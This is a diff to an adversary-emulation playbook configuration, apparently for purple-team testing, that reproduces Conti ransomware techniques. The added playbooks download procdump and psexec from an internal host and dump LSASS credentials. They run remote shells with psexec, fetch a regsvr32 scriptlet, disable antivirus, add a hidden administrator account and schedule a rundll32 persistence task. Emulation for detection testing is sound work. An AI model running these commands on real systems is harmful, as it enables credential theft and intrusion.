@@ -3,7 +3,7 @@
     "sleep": 5,
     "playbooks": [
       {
-        "name": "Conti Ransomware Emulation - Local Discovery",
+        "name": "Conti Ransomware Emulation - Discovery - Local Discovery",
         "enabled": false,
         "pbsleep": 0,
         "tasks": [
@@ -44,7 +44,7 @@
         ]
       },
       {
-        "name": "Conti Ransomware Emulation - Domain User Discovery",
+        "name": "Conti Ransomware Emulation - Discovery - Domain User Discovery",
         "enabled": false,
         "pbsleep": 0,
         "tasks": [
@@ -79,7 +79,7 @@
         ]
       },
       {
-        "name": "Conti Ransomware Emulation - Domain Computer Discovery",
+        "name": "Conti Ransomware Emulation - Discovery -  Domain Computer Discovery",
         "enabled": false,
         "pbsleep": 0,
         "tasks": [
@@ -124,7 +124,7 @@
         ]
       },
       {
-        "name": "Conti Ransomware Emulation - Download and leverage adfind",
+        "name": "Conti Ransomware Emulation - Discovery -  Download and leverage adfind",
         "enabled": false,
         "task_sleep": 3,
         "tasks": [
@@ -157,25 +157,132 @@
         ]
       },
       {
-        "name": "Conti Ransomware Emulation - Download and leverage netscan",
+        "name": "Conti Ransomware Emulation - Defense Evasion - Executing code with LOLBAS",
         "enabled": true,
         "task_sleep": 3,
         "tasks": [
           {
-                "technique_id": "T1105",
-                "technique_name": "Ingress Tool Transfer",
-                "variation": 1,
-                "url": "http://10.0.1.14/netscan.exe"
+            "technique_id": "T1218.011",
+            "technique_name": "System Binary Proxy Execution: Rundll32",
+            "dllPath": "C:\\Users\\bla\\Appdata\\Local\\Temp\\7A86.dll",
+            "exportName": "DllRegisterServer"
           },
           {
-            "technique_id": "T1059.003",
-            "command": "netscan /hide /auto:\"result.xml\" /range:10.0.0.1-10.0.1.20",
-            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+            "technique_id": "T1218.010",
+            "technique_name": "System Binary Proxy Execution: Regsvr32",
+            "url": "http://10.0.1.14/file.sct",
+            "dllPath": "scrobj.dll"
           }
         ]
       },
       {
-        "name": "Conti Ransomware Emulation - Persistence",
+        "name": "Conti Ransomware Emulation - Defense Evasion - Disable AV",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id":"T1562.001",
+            "technique_name": "Impair Defenses: Disable or Modify Tools"
+          },
+          {
+            "technique_id": "T1564.002",
+            "technique_name": "Hide Artifacts: Hidden Users",
+            "user": "oldAdmin"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Defense Evasion - Inject shellcode to explorer.exe ",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1055.002",
+            "technique_name": "Process Injection: Portable Executable Injection",
+            "process_name": "explorer"
+          }
+        ]
+      },
+
+      {
+        "name": "Conti Ransomware Emulation - Credential Access -  Dumping LSASS with rundll32",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1003.001",
+            "technique_name": "OS Credential Dumping: LSASS Memory",
+            "variation": 2
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation  - Credential Access - Dumping LSASS procdump",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1105",
+            "technique_name": "Ingress Tool Transfer",
+            "variation": 1,
+            "url": "http://10.0.1.14/procdump.exe"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+        ]
+      },
+
+      {
+        "name": "Conti Ransomware Emulation - Lateral Movement -  Remote code execution with WMI",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1047",
+            "tactic": "lateral movement",
+            "technique_name": "Windows Management Instrumentation",
+            "variation": 1,
+            "host_target_type": 2,
+            "host_target_total": 5,
+            "payload":"rundll32.exe C:\\ProgramData\\2.dll StartW"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Lateral Movement - Remote code execution with PsExec",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1105",
+            "technique_name": "Ingress Tool Transfer",
+            "variation": 1,
+            "url": "http://10.0.1.14/psexec.exe",
+            "task_sleep": 5
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "psexec.exe -accepteula -d -s \\\\10.0.1.18 C:\\windows\\system32\\cmd.exe",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "psexec.exe -accepteula -d -s \\\\10.0.1.19 C:\\windows\\system32\\cmd.exe",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "psexec.exe -accepteula -d -s \\\\10.0.1.20 C:\\windows\\system32\\cmd.exe",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+          
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation - Persistence - Adding a new user",
         "enabled": true,
         "task_sleep": 3,
         "tasks": [
@@ -184,8 +291,29 @@
             "user": "OldAdmin",
             "technique_name": "Create Account: Local Account - Cmdline",
             "variation": 1
+          },
+          {
+            "technique_id": "T1059.003",
+            "command": "net localgroup Administrators OldAdmin /add",
+            "technique_name": "Command and Scripting Interpreter: Windows Command Shell"
+          }
+        ]
+      },
+      {
+        "name": "Conti Ransomware Emulation  - Persistence -  Creating Scheduled Task",
+        "enabled": true,
+        "task_sleep": 3,
+        "tasks": [
+          {
+            "technique_id": "T1053.005",
+            "technique_name": "Scheduled Task/Job: Scheduled Task - Cmdline",
+            "variation": 1,
+            "taskName": "Update",
+            "taskPath": "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\2.dll StartW"
           }
         ]
       }
+      
+      
     ]
   }
